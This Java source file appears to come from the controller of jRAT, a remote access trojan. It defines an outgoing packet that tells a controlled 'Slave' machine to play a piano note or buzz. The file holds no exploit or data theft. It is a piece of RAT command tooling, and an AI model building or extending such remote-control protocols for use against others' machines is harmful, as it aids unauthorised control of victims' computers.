package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet66PianoNote extends AbstractOutgoingPacket {

	private int note;
	private boolean buzz;

	public Packet66PianoNote(int note, boolean buzz) {
		this.note = note;
		this.buzz = buzz;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(note);
		slave.writeBoolean(buzz);
	}

	@Override
	public short getPacketId() {
		return 66;
	}

}
